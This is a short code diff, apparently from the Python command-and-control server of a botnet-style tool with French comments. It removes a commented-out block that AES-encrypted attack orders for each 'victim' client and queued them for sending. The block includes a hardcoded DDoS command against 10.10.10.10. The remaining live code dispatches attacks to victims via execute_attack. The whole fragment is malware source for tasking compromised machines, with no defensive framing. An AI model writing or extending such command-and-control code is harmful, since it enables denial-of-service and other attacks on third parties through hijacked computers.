@@ -851,22 +851,6 @@ elif args.start:
                 for victim_uid in victims_uid:
                     for client in clients:
                         if client['uid'] == victim_uid[0]:
-                            # print("sending attack to " + str(client['addr']))
-                            # attack_sent = True
-
-                            # data_to_send = format_attack_data(attack_type, attack_id, attack_data)
-
-                            # # Envoi de l'attaque à l'ordinateur
-                            # cipher = AES.new(client['sym_key'], AES.MODE_CBC, iv=client['iv'])
-                            # #cipher_text = cipher.encrypt(pad(json.dumps(data_to_send).encode(), AES.block_size))
-                            #cipher_text = cipher.encrypt(pad('{"id":"10","attack":"ddos","cible":"10.10.10.10","arg1":"stealth,t5","arg2":"nono","arg3":""}'.encode(), AES.block_size))
-                            # print("cipher_text : ")
-                            # print(cipher_text)
-                            
-                            # decimal_elements = [byte for byte in cipher_text]
-                            # print("decimal_elements : " + str(decimal_elements))
-
-                            # client['emission_queue'].put(cipher_text)
                             execute_attack(client, attack_data)
 
                 # Mise à jour de l'attaque si elle a été envoyée au moins une fois
